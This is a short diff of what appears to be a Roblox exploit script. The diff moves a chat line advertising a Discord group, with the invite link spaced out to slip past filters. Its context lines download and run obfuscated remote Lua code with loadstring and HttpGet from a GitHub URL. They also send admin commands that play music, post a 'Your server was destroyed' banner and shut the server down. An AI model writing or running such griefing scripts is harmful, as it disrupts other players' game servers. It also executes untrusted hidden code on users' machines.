@@ -14,6 +14,7 @@ function say(msg)
 end
 wait(0.2)
 loadstring(game:HttpGet('https://raw.githubusercontent.com/TheNootNootLord/BRO/main/Obfuscated_2.lua'))()
+say("join the Noob Sploit desk o rd, desk o rd . gg / Eks AK23 x4 e ")
 wait(0.4)
 
 
@@ -64,7 +65,6 @@ game.Players:Chat(".regen")
 wait(0.1)
 game.Players:Chat(":music 142912516")
 wait(0.4)
-say("also join the Noob Sploit desk o rd, desk o rd . gg / Eks AK23 x4 e ")
 game.Players:Chat(":h Your server was destroyed by The Noot Noot Lord,  JOIN US  desk o rd . gg/ kK Eq but way")
 wait(0.3)
 game.Players:Chat(".shutdown")
